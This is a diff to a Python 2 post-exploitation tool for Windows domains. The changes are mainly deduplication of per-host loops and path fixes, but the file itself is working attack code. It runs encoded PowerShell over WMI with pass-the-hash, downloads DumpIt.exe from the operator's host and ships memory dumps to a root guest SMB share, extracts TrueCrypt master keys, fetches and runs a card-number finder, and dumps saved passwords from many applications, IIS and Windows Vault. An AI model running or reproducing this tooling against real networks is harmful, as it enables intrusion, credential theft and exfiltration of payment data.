@@ -1570,15 +1570,17 @@ def getTruecrypt(targetIP,domain,username,password,passwordHash):
             #$sOS | Select-Object Description, Caption, OSArchitecture, ServicePackMajorVersion
             (New-Object Net.WebClient).DownloadFile('http://%s:8000/DumpIt.exe','C:\\windows\\temp\\DumpIt.exe')
             $ip=get-WmiObject Win32_NetworkAdapterConfiguration|Where {$_.Ipaddress.length -gt 1} 
-            $newFilename=$ip.ipaddress[0]+"_memory_"+$sOS.Version+"_"+$sOS.OSArchitecture +"_"+$sOS.ServicePackMajorVersion +".raw"
+            $newFilename="%s_memory_"+$sOS.Version+"_"+$sOS.OSArchitecture +"_"+$sOS.ServicePackMajorVersion +".raw"
+            #$newFilename=$ip.ipaddress[0]+"_memory_"+$sOS.Version+"_"+$sOS.OSArchitecture +"_"+$sOS.ServicePackMajorVersion +".raw"
             Write-Output $newFilename
             $exe = &"C:\\windows\\temp\\DumpIt.exe" "/Q" "/O" "c:\\windows\\temp\\$($newFilename)"
             $exe
             Move-Item -Path "C:\\windows\\temp\\$($newFilename)" -Destination "\\\\%s\\guest\\$($newFilename)"
-        }""" % (myIP,myIP)
+        }""" % (myIP,targetIP,myIP)
         encodedPS=powershell_encode(s)
         command=powershellPath+" "+powershellArgs+" -ec "+encodedPS
         if debugMode==True:
+            print s
             print command
         results=runWMIEXEC(targetIP, domain, username, password, passwordHash, command)    
         tmpFileList=glob.glob(origScriptPath+"/loot/"+targetIP+"_memory_*.raw")
@@ -1596,9 +1598,12 @@ def getTruecrypt(targetIP,domain,username,password,passwordHash):
             if tmpSP=="1":
                 tmpSP="SP1"
             volProfile=tmpVer+tmpSP+tmpArch
-            cmd = "python /pentest/volatility/vol.py -f "+filename+" --profile="+volProfile+" truecryptmaster"
+            cmd = "python "+pathVolatility+"/vol.py -f "+filename+" --profile="+volProfile+" truecryptmaster"            
             cmdList=cmd.split(" ")
             resultList=subprocess.check_output(cmdList)
+            if debugMode==True:
+                print cmd
+                print resultList
             tmpResultList=resultList.split("\n")
             found=False
             for x in tmpResultList:
@@ -1649,7 +1654,8 @@ def diskCredDump(targetIP,domain,username,password,passwordHash):
         if len(x)>0:
             tmpDriveList.append(x)
     if len(tmpDriveList)>0:
-        print "[*] Fixed Disks found on host: "+" ".join(tmpDriveList)
+        if "The system cannot find the path specified" not in str(tmpDriveList):
+            print "[*] Fixed Disks found on host: "+" ".join(tmpDriveList)
         #print "\n"
     for driveNo in tmpDriveList:
         command=powershellCmdStart+' -Command "(New-Object Net.WebClient).DownloadFile(\'http://'+myIP+':8000/credit-card-finder.ps1\',\'%temp%\credit-card-finder.ps1\');%temp%\credit-card-finder.ps1 -path '+driveNo+'\\\\"'        
@@ -1770,7 +1776,7 @@ def readRemoteRegistry(targetIP,domain,username,password,passwordHash,keyPath,se
         print e
 
 def downloadFile(targetIP,domain,username,password,filePath):  
-    lootPath=os.getcwd()+"/loot"
+    lootPath=origScriptPath+"/loot"
     tmpFilePath=filePath.split(":\\")
     shareName=tmpFilePath[0]+"$"    
     filePath=tmpFilePath[1]
@@ -2564,12 +2570,13 @@ def setupSMBShare():
 
         [guest]
         force user = root
-        path = /mnt/hgfs/code/loot
+        path = %s
         browseable = yes
         writable = yes
         guest ok = yes
         read only = no
-    """
+    """ 
+    s=s.replace("%s",origScriptPath+"/loot")
     filename="/etc/samba/smb.conf"    
     target = open(filename, 'w')
     target.write(s)
@@ -2849,7 +2856,7 @@ else:
     else:
         ipList.append(inputStr)
 
-setDemo()
+#setDemo()
 cmd="rm -rf /tmp/.export"
 runCommand(cmd, shell = True, timeout = 30)
 cmd="rm -rf /tmp/ntds.export"
@@ -2935,7 +2942,7 @@ for x in nbList:
     tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
 for x in dcList:
     tmpLoginOK,tmpAdminOK=testDomainCredentials(username,password,passwordHash,x,domain)
-
+print "\n"
 
 if len(dcList)>0:
     isDA=getDomainAdminUsers(username,password,dcList[0])
@@ -3365,6 +3372,7 @@ if args.module=="files":
 if args.module=="pan":    
     tmpResultList=[]
     print (setColor("\nSearching Drives for PAN Numbers", bold, color="green"))
+    tmpDoneList=[]
     for x in accessAdmHostList:
         ip=x[0]
         domain=x[1]
@@ -3375,32 +3383,34 @@ if args.module=="pan":
         else:
             password=x[3]
             passwordHash=None
-        print "[*] Checking Host: "+ip
-        results=diskCredDump(ip,domain,username,password,passwordHash)
-        tmpFilename=''
-        found=False
-        tmpCardNoList=[]
-        for x in results:
-            if len(x)>0:
-                if found==True:
-                    x=x.strip() 
-                    if len(x)<1:
-                        tmpResultList.append([ip,tmpFilename,tmpCardNoList])
-                        tmpCardNoList=[]
-                        found=False
-                    else:
-                        if "----------------" not in x:
-                            tmpCardNoList.append(x)
-                    #if "---------------------" not in x:
-                    #    tmpList1.append(x)
-                    #else:
-                    #    tmpResultList.append([tmpFilename," ".join(tmpList1)])   
-                    #    found=False
-                    #    tmpList1=[]
-                if "File: " in x:
-                    x=x.replace("File: ","")
-                    tmpFilename=x
-                    found=True        
+        if ip not in tmpDoneList:
+            print "[*] Checking Host: "+ip
+            results=diskCredDump(ip,domain,username,password,passwordHash)
+            tmpFilename=''
+            found=False
+            tmpCardNoList=[]
+            for x in results:
+                if len(x)>0:
+                    if found==True:
+                        x=x.strip() 
+                        if len(x)<1:
+                            tmpResultList.append([ip,tmpFilename,tmpCardNoList])
+                            tmpCardNoList=[]
+                            found=False
+                        else:
+                            if "----------------" not in x:
+                                tmpCardNoList.append(x)
+                        #if "---------------------" not in x:
+                        #    tmpList1.append(x)
+                        #else:
+                        #    tmpResultList.append([tmpFilename," ".join(tmpList1)])   
+                        #    found=False
+                        #    tmpList1=[]
+                    if "File: " in x:
+                        x=x.replace("File: ","")
+                        tmpFilename=x
+                        found=True        
+            tmpDoneList.append(ip)
     if len(tmpResultList)>0:
         print (setColor("\n[+]", bold, color="green"))+" Possible PAN numbers found in the below locations"
         for x in tmpResultList:
@@ -3715,17 +3725,21 @@ if args.module=="bitlocker":
 if args.module=="truecrypt":
     print (setColor("\nDecrypting Truecrypt", bold, color="green"))
     tmpResultList=[]
+    tmpDoneList=[]
     for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        getTruecrypt(ip,domain,username,password,passwordHash)
+        if x[0] not in tmpDoneList: 
+            print "[*] Targeting Host: "+x[0]
+            tmpDoneList.append(x[0])
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            getTruecrypt(ip,domain,username,password,passwordHash)
 
 if args.module=="passwords":
     print (setColor("\nDumping PuTTY, WinSCP, Remote Desktop saved sessions, Filezilla, SuperPuTTY", bold, color="green"))
@@ -3770,55 +3784,58 @@ if args.module=="passwords":
         print tabulate(tmpResultList,headers)
 
     print (setColor("\nFind Interesting Files", bold, color="green"))
+    tmpDoneList=[]
     if len(accessAdmHostList)>0:
         for x in accessAdmHostList:
-            ip=x[0]
-            domain=x[1]
-            username=x[2]
-            if len(x[3])==65 and x[3].count(":")==1:
-                passwordHash=x[3]
-                password=None
-            else:
-                password=x[3]
-                passwordHash=None
-            tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
-            if len(tmpFileList)>0:
-                count=0
-                for filename in tmpFileList:           
-                    filename=filename.strip()
-                    tmpFilename=(downloadFile(ip,domain,username,password,filename))
-                    if len(tmpFilename)>0:
-                        if count>0:
-                            print (setColor("\n[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
+            if x[0] not in tmpDoneList:
+                ip=x[0]
+                domain=x[1]
+                username=x[2]
+                if len(x[3])==65 and x[3].count(":")==1:
+                    passwordHash=x[3]
+                    password=None
+                else:
+                    password=x[3]
+                    passwordHash=None
+                tmpFileList=findInterestingFiles(ip,domain,username,password,passwordHash)
+                if len(tmpFileList)>0:
+                    count=0
+                    for filename in tmpFileList:           
+                        filename=filename.strip()
+                        tmpFilename=(downloadFile(ip,domain,username,password,filename))
+                        if len(tmpFilename)>0:
+                            if count>0:
+                                print (setColor("\n[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
 
-                        else:
-                            print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
-                        if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
-                            tmpResultList=parseUnattendXML(tmpFilename)
-                            if len(tmpResultList)>0:
-                                headers = ["Username","Password"]
-                                print tabulate(tmpResultList,headers,tablefmt="simple")
-                                print "\n"
-                        if "ultravnc.ini" in filename.lower():
-                            tmpResultList=parseUltraVNC(tmpFilename)
-                            for x in tmpResultList:
-                                print "Password1: "+x[0]
-                                print "Password2: "+x[1]
-                        if "sitemanager.xml" in filename.lower():
-                            tmpResultList=parseSiteManagerXML(tmpFilename)
-                            headers = ["Host", "Username","Password"]
-                            print tabulate(tmpResultList,headers,tablefmt="simple")                    
-                        if ".txt" in filename.lower():
-                            with open(tmpFilename) as f:
-                                lines = f.read().splitlines()
-                                count1=0
-                                if len(lines)<10:
-                                    for x in lines:
-                                        x=x.strip()
-                                        if count1<10:
-                                            print x
-                                    count1+=1
-                        count+=1
+                            else:
+                                print (setColor("[+]", bold, color="green"))+" "+ip+":445 "+getNetBiosName(ip)+" | "+filename+" | "+tmpFilename
+                            if "unattend.xml" in filename.lower() or "sysprep.xml" in filename.lower():
+                                tmpResultList=parseUnattendXML(tmpFilename)
+                                if len(tmpResultList)>0:
+                                    headers = ["Username","Password"]
+                                    print tabulate(tmpResultList,headers,tablefmt="simple")
+                                    print "\n"
+                            if "ultravnc.ini" in filename.lower():
+                                tmpResultList=parseUltraVNC(tmpFilename)
+                                for x in tmpResultList:
+                                    print "Password1: "+x[0]
+                                    print "Password2: "+x[1]
+                            if "sitemanager.xml" in filename.lower():
+                                tmpResultList=parseSiteManagerXML(tmpFilename)
+                                headers = ["Host", "Username","Password"]
+                                print tabulate(tmpResultList,headers,tablefmt="simple")                    
+                            if ".txt" in filename.lower():
+                                with open(tmpFilename) as f:
+                                    lines = f.read().splitlines()
+                                    count1=0
+                                    if len(lines)<10:
+                                        for x in lines:
+                                            x=x.strip()
+                                            if count1<10:
+                                                print x
+                                        count1+=1
+                            count+=1
+            tmpDoneList.append(x[0])
 
     print (setColor("\nDumping Bitlocker Recovery Keys", bold, color="green"))
     tmpResultList=[]
@@ -3871,17 +3888,20 @@ if args.module=="passwords":
 
     print (setColor("\nDumping Truecrypt Master Keys", bold, color="green"))
     tmpResultList=[]
+    tmpDoneList=[]
     for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=getTruecrypt(ip,domain,username,password,passwordHash)
+        if x[0] not in tmpDoneList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=getTruecrypt(ip,domain,username,password,passwordHash)
+            tmpDoneList.append(x[0])
 
     print (setColor("\nDumping Browser Passwords", bold, color="green"))
     tmpResultList=[]
@@ -3905,19 +3925,22 @@ if args.module=="passwords":
 
     print (setColor("\nIIS Credentials", bold, color="green"))
     tmpResultList=[]
+    tmpDoneList=[]
     for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=dumpIIS(ip,domain,username,password,passwordHash)
-        for y in results:
-            tmpResultList.append(y)
+        if x[0] not in tmpDoneList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=dumpIIS(ip,domain,username,password,passwordHash)
+            for y in results:
+                tmpResultList.append(y)
+        tmpDoneList.append(x[0])
     if len(tmpResultList)>0:
         print tabulate(tmpResultList,tablefmt="simple")
     else:
@@ -3925,19 +3948,22 @@ if args.module=="passwords":
 
     print setColor('\nWindows Vault Credentials', bold, color='green')
     tmpResultList=[]
+    tmpDoneList=[]
     for x in accessAdmHostList:
-        ip=x[0]
-        domain=x[1]
-        username=x[2]
-        if len(x[3])==65 and x[3].count(":")==1:
-            passwordHash=x[3]
-            password=None
-        else:
-            password=x[3]
-            passwordHash=None
-        results=runDumpVault(ip,domain,username,password,passwordHash)
-        for y in results:
-            tmpResultList.append(y)
+        if x[0] not in tmpDoneList:
+            ip=x[0]
+            domain=x[1]
+            username=x[2]
+            if len(x[3])==65 and x[3].count(":")==1:
+                passwordHash=x[3]
+                password=None
+            else:
+                password=x[3]
+                passwordHash=None
+            results=runDumpVault(ip,domain,username,password,passwordHash)
+            for y in results:
+                tmpResultList.append(y)
+        tmpDoneList.append(x[0])
     if len(tmpResultList)>0:
         print tabulate(tmpResultList,tablefmt="simple")
     else:
